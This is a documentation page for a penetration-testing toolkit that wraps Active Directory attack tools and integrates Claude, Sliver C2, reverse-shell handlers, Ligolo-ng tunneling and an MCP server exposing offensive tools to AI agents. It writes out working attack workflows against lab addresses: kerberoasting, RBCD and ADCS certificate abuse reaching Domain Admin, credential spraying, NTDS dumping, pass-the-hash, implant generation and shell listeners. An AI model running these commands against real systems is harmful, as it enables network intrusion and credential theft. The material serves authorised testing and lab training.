---
layout: default
title: Integrations - UwU Toolkit
permalink: /uwu-toolkit/integrations/
---

# Integrations

UwU Toolkit integrates with external tools and services to enhance your penetration testing workflow.

---

## Table of Contents

- [Exegol Integration](#exegol-integration)
- [Impacket](#impacket)
- [BloodyAD](#bloodyad)
- [Certipy](#certipy)
- [NetExec](#netexec)
- [Claude AI Integration](#claude-ai-integration)
- [Sliver C2 Integration](#sliver-c2-integration)
- [Penelope Shell Handler](#penelope-shell-handler)
- [Ligolo-ng Tunneling](#ligolo-ng-tunneling)
- [MCP Server](#mcp-server)

---

## Exegol Integration

[Exegol](https://github.com/ThePorgs/Exegol) is a community-driven hacking environment with pre-installed tools. UwU Toolkit seamlessly runs commands inside Exegol containers.

### Setup

```bash
# Install Exegol
pip install exegol

# Start a container
exegol start htb full

# Set container in UwU Toolkit
uwu > setg EXEGOL_CONTAINER exegol-htb
```

### How It Works

When a module needs tools not installed locally:

1. **Tool Detection** - Module calls `find_tool("GetUserSPNs.py")`
2. **Local Check** - Searches extended PATH (`~/.local/bin`, `/opt/tools`, `/usr/bin`, etc.)
3. **Exegol Fallback** - If not found, uses `run_in_exegol()` to execute in container
4. **Output Return** - Results are captured and returned to UwU Toolkit

### Kali Compatibility

The same codebase works on Kali without code changes:
- `find_tool()` checks `~/.local/bin` and `/usr/bin` (where Kali puts pip-installed tools)
- Wordlist resolution checks `/usr/share/seclists` (Kali's default)
- `WORKING_DIR` auto-detects `~/htb` or `~/ctf` if they exist

### Module Example

```python
def run(self) -> bool:
    # Try local first
    tool_path = find_tool("impacket-GetUserSPNs")

    if tool_path:
        self.print_status("Using local tools")
        ret, stdout, stderr = self.run_command([tool_path, ...])
    else:
        self.print_status("Using Exegol")
        ret, stdout, stderr = self.run_in_exegol("GetUserSPNs.py ...")

    return ret == 0
```

### Container Auto-Detection

If `EXEGOL_CONTAINER` is not set:

1. Searches for running containers starting with `exegol-`
2. Uses the first match found
3. Prompts if multiple containers are running

### Running Commands in Exegol

```python
# Simple command
ret, stdout, stderr = self.run_in_exegol(
    "GetUserSPNs.py 'domain/user:pass' -dc-ip 10.10.10.100",
    timeout=120
)

# Specify container explicitly
ret, stdout, stderr = self.run_in_exegol(
    "NetExec smb target -u user -p pass",
    container="exegol-htb",
    timeout=60
)
```

---

## Impacket

[Impacket](https://github.com/fortra/impacket) tools are wrapped as UwU modules. Set your globals once, then switch between modules without re-entering credentials.

### Setup

```bash
# Set globals once for all Impacket modules
uwu > setg RHOSTS 10.10.10.100
uwu > setg DOMAIN corp.local
uwu > setg USER admin
uwu > setg PASS Password123
```

### Modules

| Module | Description |
|--------|-------------|
| `ad/kerberoast` | Kerberoast — extract TGS tickets for offline cracking |
| `ad/asreproast` | AS-REP Roast — extract hashes for accounts without pre-auth |
| `ad/targeted_kerberoast` | Kerberoast a specific user via SPN manipulation |
| `ad/kerb_userenum` | Enumerate valid domain usernames via Kerberos |
| `ad/delegation_exploit` | Exploit constrained/unconstrained delegation |
| `ad/rbcd_auto` | Full RBCD attack chain (add computer, set delegation, impersonate) |

### Kerberoast

```bash
uwu > use ad/kerberoast
uwu kerberoast > options

  Name          Current     Required  Description
  ----          -------     --------  -----------
  RHOSTS        10.10.10.1  yes       Domain Controller IP
  DOMAIN        corp.local  yes       Domain name
  USER          admin       yes       Domain username
  PASS          Password123 yes       Domain password
  TARGET_USER                no       Specific user to kerberoast
  OUTPUT        kerberoast  no       Output file for hashes
  AUTO_CRACK    no           no       Automatically crack via SSH

uwu kerberoast > run
```

### AS-REP Roast

```bash
uwu > use ad/asreproast
uwu asreproast > run    # globals already set
```

### Delegation Exploit

```bash
uwu > use ad/delegation_exploit
uwu delegation_exploit > options

  Name              Current       Required  Description
  ----              -------       --------  -----------
  RHOSTS            10.10.10.1    yes       Domain Controller IP
  DOMAIN            corp.local    yes       Domain name
  USER              admin         yes       Domain username
  PASS              Password123   yes       Domain password
  DELEGATION_TYPE   auto          no       auto, constrained, unconstrained, rbcd
  TARGET                          no       Specific delegation target
  IMPERSONATE       administrator no       User to impersonate
  ACTION            auto          no       auto, enumerate, exploit

uwu delegation_exploit > set TARGET svc_sql
uwu delegation_exploit > run
```

### RBCD Attack Chain

```bash
uwu > use ad/rbcd_auto
uwu rbcd_auto > set TARGET DC01$
uwu rbcd_auto > set IMPERSONATE administrator
uwu rbcd_auto > run

[*] Step 1: Adding fake computer FAKECOMP$...
[+] Computer added
[*] Step 2: Setting RBCD on DC01$...
[+] Delegation configured
[*] Step 3: Requesting service ticket as administrator...
[+] Ticket saved to /tmp/rbcd_auto/administrator.ccache
```

### Auto-Crack Integration

Kerberoast and AS-REP modules can auto-crack hashes via SSH:

```bash
uwu kerberoast > set AUTO_CRACK yes
uwu kerberoast > set SSH_HOST gpu-box
uwu kerberoast > set WORDLIST /opt/rockyou.txt
uwu kerberoast > run

[+] 3 hashes extracted
[*] Sending to gpu-box for cracking...
[+] Cracked: svc_sql:Password1
```

---

## BloodyAD

[BloodyAD](https://github.com/CravateRouge/bloodyAD) is wrapped as a UwU module for ACL enumeration and abuse. Globals provide the authentication — you only set the target-specific options.

### Module

```bash
uwu > use ad/bloodyad_validate
uwu bloodyad_validate > options

  Name          Current      Required  Description
  ----          -------      --------  -----------
  RHOSTS        10.10.10.1   yes       Domain Controller IP
  DOMAIN        corp.local   yes       Domain name
  USER          admin        yes       Domain username
  PASS          Password123  yes       Domain password
  TARGET_USER                no       Target user for object queries
  TARGET_GROUP               no       Target group for membership queries
  TARGET_OU                  no       Target OU for children queries
  MODE          read         no       Test mode: tools_only, read, full

uwu bloodyad_validate > set MODE read
uwu bloodyad_validate > run

[*] Testing BloodyAD read operations...
[+] get writable: 12 writable objects found
[+] get object admin: attributes retrieved
[+] get membership admin: 3 groups
```

### Full ACL Abuse Mode

```bash
uwu bloodyad_validate > set MODE full
uwu bloodyad_validate > set TARGET_USER victim
uwu bloodyad_validate > set TARGET_GROUP "Domain Admins"
uwu bloodyad_validate > run

[*] Testing BloodyAD write operations...
[+] add groupMember: victim added to Domain Admins
[+] set password: victim password reset
[+] add shadowCredentials: key credential added
```

---

## Certipy

[Certipy](https://github.com/ly4k/Certipy) is wrapped in three modules for ADCS — from discovery to full exploitation. Globals handle authentication.

### Modules

| Module | Description |
|--------|-------------|
| `ad/certipy_find` | Discover vulnerable ADCS templates |
| `ad/certipy_exploit` | Request certs and authenticate as target users |
| `ad/adcs_auto` | Automated end-to-end scan + exploit (ESC1/2/3/6/9) |

### Find Vulnerable Templates

```bash
uwu > use ad/certipy_find
uwu certipy_find > options

  Name             Current       Required  Description
  ----             -------       --------  -----------
  RHOSTS           10.10.10.1    yes       Domain Controller IP
  DOMAIN           corp.local    yes       Domain name
  USER             admin         yes       Domain username
  PASS             Password123   yes       Domain password
  VULNERABLE_ONLY  yes           no       Only show vulnerable templates
  OUTPUT           certipy_out   no       Output file prefix

uwu certipy_find > run

[*] Enumerating ADCS templates...
[+] CA: CORP-DC01-CA
[+] ESC1: WebServer — enrollee supplies SAN
[+] ESC4: DevTemplate — tyrion has WritePKIEnrollmentFlag
```

### Exploit a Vulnerable Template

```bash
uwu > use ad/certipy_exploit
uwu certipy_exploit > set CA CORP-DC01-CA
uwu certipy_exploit > set TEMPLATE WebServer
uwu certipy_exploit > set TARGET_USER administrator
uwu certipy_exploit > run

[*] Requesting certificate for administrator@corp.local...
[+] Certificate saved to administrator.pfx
[*] Authenticating with certificate...
[+] Got NT hash for administrator
```

### Automated Full Chain

```bash
uwu > use ad/adcs_auto
uwu adcs_auto > run    # globals already set

[*] Phase 1: Scanning for vulnerable templates...
[*] Phase 2: Best path: ESC1 via WebServer
[*] Phase 3: Requesting cert as administrator...
[+] Domain Admin hash obtained
```

---

## NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) is available as both a full UwU module and a console shortcut. The module uses the same `set`/`run` workflow as everything else.

### Module

```bash
uwu > use ad/netexec
uwu netexec > options

  Name                Current       Required  Description
  ----                -------       --------  -----------
  RHOSTS              10.10.10.1    yes       Target host(s) - IP, range, or CIDR
  DOMAIN              corp.local    no       Domain name
  USER                admin         no       Username or user file
  PASS                Password123   no       Password, hash, or password file
  PROTOCOL            smb           no       smb, ldap, winrm, rdp, mssql, ssh, wmi
  ACTION              check         no       check, shares, users, groups, sessions, ...
  AUTH_TYPE            password      no       password, hash, aesKey
  EXECUTE                           no       Command to execute on target
  EXEC_TYPE            cmd          no       cmd or powershell
  NXC_MODULE                        no       NetExec module to run (-M)
  NXC_MODULE_OPTIONS                no       Module options (key=value)
  CONTINUE_ON_SUCCESS  no           no       Continue after finding valid creds

uwu netexec > set ACTION shares
uwu netexec > run

  SMB  10.10.10.100  CORP  [+] admin:Password123
  SMB  10.10.10.100  CORP  ADMIN$     READ,WRITE
  SMB  10.10.10.100  CORP  C$         READ,WRITE
  SMB  10.10.10.100  CORP  SYSVOL     READ
```

### Credential Spraying

```bash
uwu netexec > set RHOSTS 10.10.10.0/24
uwu netexec > set USER users.txt
uwu netexec > set PASS passwords.txt
uwu netexec > set CONTINUE_ON_SUCCESS yes
uwu netexec > set ACTION check
uwu netexec > run
```

### Remote Execution

```bash
uwu netexec > set ACTION execute
uwu netexec > set EXECUTE "whoami /all"
uwu netexec > run
```

### NTDS Dump

```bash
uwu netexec > set ACTION ntds
uwu netexec > run
```

### LAPS via Module

```bash
uwu netexec > set PROTOCOL ldap
uwu netexec > set NXC_MODULE laps
uwu netexec > set LAPS_COMPUTER DC01
uwu netexec > run
```

### Pass-the-Hash

```bash
uwu netexec > set AUTH_TYPE hash
uwu netexec > set PASS aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
uwu netexec > set ACTION check
uwu netexec > run
```

### Console Shortcut

The `nxc` command also works directly for quick one-off checks:

```bash
uwu > nxc smb 10.10.10.100 -u admin -p Password123 --shares
uwu > nxc ldap 10.10.10.100 -u admin -p Password123 -M laps
```

---

## Claude AI Integration

UwU Toolkit includes an AI-powered assistant using Claude for security research, code analysis, and interactive help.

### Requirements

```bash
# Install Anthropic SDK
pip install anthropic

# Set API key in UwU Toolkit
uwu > setg ANTHROPIC_API_KEY sk-ant-api03-your-key-here
```

### Getting an API Key

1. Visit [console.anthropic.com](https://console.anthropic.com)
2. Create an account or sign in
3. Navigate to API Keys
4. Create a new API key
5. Copy the key (starts with `sk-ant-api03-`)

### Verify Setup

```bash
uwu > claude status
[+] Claude AI is available
[*] Model: claude-sonnet-4-20250514
```

### Interactive Mode

Enter a full conversation with Claude:

```bash
uwu > claude
uwu > claude mode

[Claude AI Mode]
Type 'exit' or Ctrl+D to return
Type 'help' for commands

claude > How do I enumerate Active Directory?
```

**Session Commands:**
- `exit`, `back` - Return to UwU console
- `Ctrl+D` - Background session (keep conversation)
- `new` - Start new conversation
- `clear` - Clear conversation history
- `help` - Show commands

### Resume Session

```bash
# Background with Ctrl+D, then resume later
uwu > claude resume
uwu > claude fg   # Alias
```

### Session Management

```bash
uwu > claude sessions

  Claude Sessions
  ==================================================

  * abc123  Main Session
      5 prompts, created 14:30:22
    def456  Code Review
      3 prompts, created 10:15:00
```

### Quick Commands

One-shot queries without entering interactive mode:

```bash
# Ask a question
uwu > claude ask "How do I crack Kerberos TGS hashes?"

# With file context
uwu > claude ask "Explain this code" --context ./script.py
```

### Code Analysis

Analyze code for security vulnerabilities:

```bash
# Analyze a directory
uwu > claude analyze ./webapp/

# Analyze specific file with focus
uwu > claude analyze ./api.py --focus "injection"

# Output:
[*] Analyzing ./webapp/...

  Security Analysis
  ==================================================

  HIGH: SQL Injection in login.py:45
    query = f"SELECT * FROM users WHERE name='{username}'"
    Recommendation: Use parameterized queries

  MEDIUM: Missing input validation in api.py:23
    User input passed directly to system command
```

### Code Debugging

Debug code for errors:

```bash
# Debug a file
uwu > claude debug ./module.py

# With specific error message
uwu > claude debug ./script.py --error "ImportError: No module named requests"
```

### Change Model

```bash
# View current model
uwu > claude model
[*] Current model: claude-sonnet-4-20250514

# Change model
uwu > claude model claude-opus-4-20250514
```

### Security Context

Claude understands penetration testing context and can help with:

- Explaining attack techniques
- Analyzing tool output
- Suggesting next steps in an engagement
- Code review for exploits
- Methodology guidance (HackTricks, MITRE ATT&CK)

**Example:**
```
claude > I found a Kerberoastable user with GetUserSPNs. The hash format
         is $krb5tgs$23$*... What's my next step?

Claude: Great find! Here's your attack path:

1. Save the hash to a file (e.g., kerberoast.txt)
2. Crack with hashcat:
   hashcat -m 13100 kerberoast.txt rockyou.txt

3. If weak password, you now have creds for that service account
4. Check if the account has elevated privileges...
```

---

## Sliver C2 Integration

[Sliver](https://github.com/BishopFox/sliver) is an open-source cross-platform adversary emulation/C2 framework. UwU Toolkit provides integrated management.

### Requirements

```bash
# Download Sliver
curl https://sliver.sh/install | sudo bash

# Or manually
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
chmod +x sliver-*
sudo mv sliver-server_linux /usr/local/bin/sliver-server
sudo mv sliver-client_linux /usr/local/bin/sliver-client
```

### Generate Client Config

On the Sliver server:

```bash
# Start server
sliver-server

# Generate operator config
sliver > new-operator --name p3ta --lhost 10.10.14.50
[*] Wrote operator config to: p3ta.cfg
```

Import on client:

```bash
sliver-client import ./p3ta.cfg
```

Configs are stored in `~/.sliver-client/configs/`.

### Server Management

```bash
# Start Sliver server (background)
uwu > sliver start
[*] Starting Sliver server...
[+] Sliver server started

# Stop server
uwu > sliver stop
[*] Stopping Sliver server...
[+] Sliver server stopped
```

### Connect Client

```bash
# Connect with default config
uwu > sliver connect

# Connect with specific config
uwu > sliver connect p3ta

# Full Sliver client interface
sliver > help
sliver > implants
sliver > use 1
```

### Client Interaction

While in Sliver mode:

- Full Sliver client functionality available
- All Sliver commands work (`sessions`, `implants`, `generate`, etc.)
- `Ctrl+D` - Background session (return to UwU)
- `exit` - Exit and return to UwU

### Resume Session

```bash
# After backgrounding with Ctrl+D
uwu > sliver resume
uwu > sliver fg   # Alias
```

### Status Check

```bash
uwu > sliver status

  Sliver Status
  ========================================

  Server:  Running
  Client:  Backgrounded (use 'sliver resume')
  Configs: 2 available
  Client:  /usr/local/bin/sliver-client
  Server:  /usr/local/bin/sliver-server
```

### List Configs

```bash
uwu > sliver configs

  Sliver Client Configs
  ========================================

    p3ta
      /home/p3ta/.sliver-client/configs/p3ta.cfg
    operator2
      /home/p3ta/.sliver-client/configs/operator2.cfg
```

### Typical Workflow

```bash
# 1. Start server
uwu > sliver start

# 2. Connect client
uwu > sliver connect

# 3. Generate implant
sliver > generate --mtls 10.10.14.50:443 --os windows --arch amd64 --save implant.exe

# 4. Start listener
sliver > mtls -l 443

# 5. Wait for callback, then interact
sliver > sessions
sliver > use 1

# 6. Background to UwU (keep session)
# Press Ctrl+D

uwu > # Continue with other tasks

# 7. Resume when needed
uwu > sliver resume
```

### Integration Benefits

- **Session Persistence** - Background and resume without losing state
- **Unified Interface** - Manage C2 alongside other tools
- **Variable Sharing** - Use UwU global variables in Sliver commands
- **Workflow Integration** - Switch between enumeration, exploitation, and C2

---

## Penelope Shell Handler

[Penelope](https://github.com/brightio/penelope) is an advanced shell handler with auto-upgrade capabilities. UwU Toolkit provides full interactive integration with session management.

### Requirements

```bash
# Clone Penelope
git clone https://github.com/brightio/penelope.git /opt/penelope

# Or install via pip (if available)
pip install penelope-shell

# Make executable
chmod +x /opt/penelope/penelope.py
```

### Start Listener

```bash
# Default port (4444)
uwu > penelope

# Specific port
uwu > penelope 9001

# Specific interface
uwu > penelope -i 10.10.14.50 4444
```

### Interactive Mode

When Penelope starts, you're in full interactive mode:

```
  ╔══════════════════════════════════════════════════════╗
  ║  Penelope Shell Handler                              ║
  ║  Listening on 0.0.0.0:4444                           ║
  ║  Ctrl+D - Background and return to UwU               ║
  ║  quit   - Exit Penelope and return to UwU            ║
  ╚══════════════════════════════════════════════════════╝

[+] Listening on 0.0.0.0:4444
```

### Background & Resume

```bash
# While in Penelope, press Ctrl+D to background
# Listener remains active!

[*] Penelope session backgrounded
    Listener still active on port 4444
    Use 'penelope resume' or 'penelope fg' to return
    Use 'shells' to see connected sessions

# Resume later
uwu > penelope resume
uwu > penelope fg   # Alias
```

### Session Integration

Penelope sessions automatically appear in the shell manager:

```bash
uwu > shells

  Active Shells
  ========================================

  ID   Type       Remote             User@Host            Status
  ---- ---------- ------------------ -------------------- --------
  1    penelope   10.10.10.100:49123 www-data@victim      ACTIVE
  2    penelope   10.10.10.50:51234  root@server          ACTIVE
```

### Status Check

```bash
uwu > penelope status

  Penelope Status
  ========================================

  Status:   Backgrounded (use 'penelope resume')
  Port:     4444
  Sessions: 2
  Binary:   /opt/penelope/penelope.py
```

### Penelope Features

Inside Penelope, you get:

- **Auto PTY Upgrade** - Shells automatically upgraded
- **Multi-Session** - Handle multiple shells simultaneously
- **File Transfer** - Upload/download files easily
- **Spawn** - Spawn additional listeners

```
penelope> show           # List sessions
penelope> interact 1     # Interact with session
penelope> upgrade        # Upgrade to PTY
penelope> download /etc/passwd
penelope> upload ./linpeas.sh /tmp/
penelope> spawn 9002     # New listener on 9002
```

---

## Ligolo-ng Tunneling

[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) is a simple, lightweight tunneling tool using TUN interfaces. UwU Toolkit provides full proxy management with route configuration.

### Requirements

```bash
# Download from releases
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_Linux_64bit.tar.gz

# Extract
tar -xzf ligolo-ng_proxy_Linux_64bit.tar.gz
tar -xzf ligolo-ng_agent_Linux_64bit.tar.gz

# Move to path
sudo mv proxy /usr/local/bin/ligolo-proxy
sudo mv agent /usr/local/bin/ligolo-agent
```

### Start Proxy

```bash
# Default port (11601) with auto TUN creation
uwu > ligolo

# Specific port
uwu > ligolo 11601

# Custom TUN interface
uwu > ligolo -tun mytun 11601
```

### TUN Interface Setup

UwU Toolkit automatically creates the TUN interface:

```
[*] Checking TUN interface 'ligolo'...
[!] TUN interface 'ligolo' not found, creating...
[+] TUN interface 'ligolo' created

  ╔══════════════════════════════════════════════════════╗
  ║  Ligolo-ng Proxy                                     ║
  ║  Listening on 0.0.0.0:11601                          ║
  ║  TUN Interface: ligolo                               ║
  ║  Ctrl+D - Background and return to UwU               ║
  ║  exit   - Exit Ligolo and return to UwU              ║
  ╚══════════════════════════════════════════════════════╝
```

If automatic creation fails, create manually:

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

### Background & Resume

```bash
# While in Ligolo, press Ctrl+D to background
# Proxy and tunnels remain active!

[*] Ligolo-ng session backgrounded
    Proxy still active on port 11601
    TUN interface 'ligolo' remains active
    Use 'ligolo resume' or 'ligolo fg' to return

# Resume later
uwu > ligolo resume
uwu > ligolo fg   # Alias
```

### Route Management

Add routes to access internal networks through the tunnel:

```bash
# Add route
uwu > ligolo route add 10.10.10.0/24
[+] Route added: 10.10.10.0/24 via ligolo

# Add another subnet
uwu > ligolo route add 172.16.0.0/16

# List routes
uwu > ligolo routes

  Ligolo Routes
  ========================================

    10.10.10.0/24 via ligolo
    172.16.0.0/16 via ligolo

# Remove route
uwu > ligolo route del 172.16.0.0/16
```

### Agent Management

View connected agents:

```bash
uwu > ligolo agents

  Ligolo-ng Agents
  ============================================================

  ID   Remote IP        Hostname             User         Tunnel
  ---- ---------------- -------------------- ------------ --------
  0    10.10.10.100     DC01                 CORP\admin   active
  1    10.10.10.50      WEB01                www-data     idle
```

### Status Check

```bash
uwu > ligolo status

  Ligolo-ng Status
  ========================================

  Status:    Backgrounded (use 'ligolo resume')
  Port:      11601
  TUN:       ligolo
  Agents:    2
  Binary:    /usr/local/bin/ligolo-proxy
  Routes:    10.10.10.0/24, 172.16.0.0/16
```

### Typical Workflow

```bash
# 1. Start proxy
uwu > ligolo

# 2. On target, run agent
./agent -connect YOUR_IP:11601 -ignore-cert

# 3. In Ligolo, select session
ligolo» session
? Specify a session:
> 0 - CORP\admin@DC01 - 10.10.10.100

# 4. Start tunnel
ligolo» start

# 5. Background to UwU
# Press Ctrl+D

# 6. Add routes
uwu > ligolo route add 10.10.10.0/24

# 7. Now you can access internal network directly!
uwu > !nmap -sV 10.10.10.50

# 8. Resume Ligolo when needed
uwu > ligolo resume
```

### Inside Ligolo Proxy

```
ligolo» session         # List/select sessions
ligolo» ifconfig        # Show agent interfaces
ligolo» start           # Start tunnel
ligolo» stop            # Stop tunnel
ligolo» listener_add    # Add reverse port forward
ligolo» listener_list   # List port forwards
```

---

## Shell Management

UwU Toolkit includes Sliver-like shell session management for basic reverse shells.

### Start Listener

```bash
# Netcat listener
uwu > listen 4444
uwu > listen 4444 nc

# Penelope listener (if available)
uwu > listen 4444 penelope
```

### List Sessions

```bash
uwu > shells
uwu > sessions   # Alias

  Active Shells
  ========================================

  ID   Type   Remote             Status     Upgraded
  ---- ------ ------------------ ---------- --------
  1    nc     10.10.10.100:49123 active     no
  2    nc     10.10.10.50:51234  active     yes
```

### Interact with Shell

```bash
uwu > interact 1
[*] Interacting with shell 1
[*] Press Ctrl+D to background

$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ^D
[*] Shell backgrounded
```

### Kill Session

```bash
uwu > kill 1
[+] Shell 1 killed
```

---

## MCP Server

UwU Toolkit includes a [Model Context Protocol](https://modelcontextprotocol.io/) (MCP) server that exposes its pentesting tools and data to AI assistants like Claude Code.

### Architecture

The MCP server uses [FastMCP](https://github.com/jlowin/fastmcp) and exposes three resource types:

| Type | Description |
|------|-------------|
| **Tools** | 50+ security tools (Impacket, NetExec, Certipy, BloodyAD, nmap, LDAP) plus module/session/engagement management |
| **Resources** | Module catalog, available tools list, lab configurations |
| **Prompts** | Guided workflows for AD enumeration, attack path planning, lateral movement |

### Tool Categories

| Module | Tools |
|--------|-------|
| `impacket_tools` | secretsdump, psexec, wmiexec, smbexec, dcomexec, getTGT, getST, GetUserSPNs, GetNPUsers, addcomputer, rbcd, dacledit, findDelegation, mssqlclient, smbclient, lookupsid, GetLAPSPassword, GetGPPPassword |
| `netexec_tools` | Multi-protocol credential validation and enumeration (SMB, LDAP, WinRM, RDP, MSSQL, SSH, WMI) |
| `certipy_tools` | ADCS enumeration (find), certificate requests (req), authentication (auth), shadow credentials |
| `enum_tools` | nmap scanning, LDAP search, BloodyAD ACL analysis, shell command execution |
| `module_tools` | List, search, info, and run UwU modules |
| `session_tools` | Shell session management |
| `engagement_tools` | Target and credential tracking via the engagement database |
| `job_tools` | Background job management |
| `opsec_tools` | OpSec rating and assessment |

### Starting the Server

**From inside UwU console (background thread):**

The MCP server starts automatically when the console launches, listening on `0.0.0.0:9400/uwu`.

**Standalone mode:**

```bash
python3 -m uwu_mcp.run_server --host 0.0.0.0 --port 9400 --debug
```

**Via start script (Exegol container):**

```bash
./uwu_mcp/start.sh [PORT]
```

### Connecting Claude Code

Add the server to your Claude Code MCP configuration:

```json
{
  "mcpServers": {
    "uwu-toolkit": {
      "type": "url",
      "url": "http://<CONTAINER_IP>:9400/uwu"
    }
  }
}
```

### Resources

| URI | Description |
|-----|-------------|
| `uwu://modules` | Full module catalog with paths, descriptions, tags, and platform |
| `uwu://tools` | Available security tool binaries with their paths |
| `uwu://lab/iron_throne` | Iron Throne AD lab configuration (users, credentials, attack paths, ADCS templates) |

### Prompts

| Prompt | Description |
|--------|-------------|
| `ad_enumeration` | Guided AD enumeration workflow (users, groups, ACLs, ADCS, delegation, shares) |
| `attack_path_planning` | Plan attack paths from compromised user to target privilege |
| `iron_throne_walkthrough` | Guided walkthrough for the Iron Throne lab (beginner/intermediate/advanced) |
| `lateral_movement` | Lateral movement planning with credential type awareness |

---

[Back to Wiki Index](/uwu-toolkit/)
